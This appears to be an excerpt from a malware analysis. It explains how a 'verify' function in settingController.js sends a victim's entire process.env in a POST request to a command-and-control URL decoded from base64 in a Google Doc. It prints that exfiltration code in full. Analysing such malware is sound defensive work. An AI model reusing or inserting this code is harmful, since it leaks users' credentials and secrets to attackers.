The malware exfiltrates environment variables using the `verify` function in `settingController.js`, which sends a POST request to the C2 URL with the victim's `process.env` object. Here's the relevant code:
js
const verify = async (apiKey) => {
  return axios.post(api, { ...process.env }, {
    headers: { "x-secret-header": "secret" }
  });
};

The `api` variable is derived from the base64-decoded content of the Google Doc, and the `process.env` object contains all environment variables from the victim's shell.
